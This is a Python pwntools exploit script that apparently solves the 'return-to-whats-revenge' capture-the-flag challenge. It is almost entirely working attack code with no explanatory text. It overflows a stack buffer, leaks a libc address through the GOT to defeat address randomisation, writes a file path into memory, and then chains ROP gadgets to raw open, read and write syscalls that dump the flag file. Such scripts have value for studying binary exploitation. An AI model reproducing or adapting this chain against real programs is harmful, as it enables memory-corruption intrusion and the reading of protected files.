from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './return-to-whats-revenge'
HOST = 'chal.duc.tf'
PORT = 30006

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0x11d9])

flag = "/chal/flag.txt\x00"
# flag = "./flag.txt\x00"
rdi = 0x4019db

payload = "a"*56
payload += flat(rdi, elf.got.puts, elf.plt.puts, elf.sym.main)

r.sendlineafter('to?\n', payload)
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')

base = leak - 0x00000000000809c0
syscall = base + 0x000e58e5
rax = base + 0x0010fdcc
rdx = base + 0x001306b6
rsi = base + 0x001461a5

bss = 0x4043e0
payload = "a"*56
payload += flat(rdi, bss, elf.plt.gets, elf.sym.main)
r.sendlineafter('to?\n', payload)
r.sendline(flag.ljust(0x10, '\x00'))

payload = "a"*56
payload += flat(rdi, bss, rsi, 0, rdx, 0, rax, 2, syscall)
payload += flat(rdi, 3, rsi, bss, rdx, 0x199, rax, 0, syscall)
payload += flat(rdi, 1, rsi, bss, rdx, 0x199, rax, 1, syscall)
r.sendlineafter('to?\n', payload)
r.interactive()
r.close()
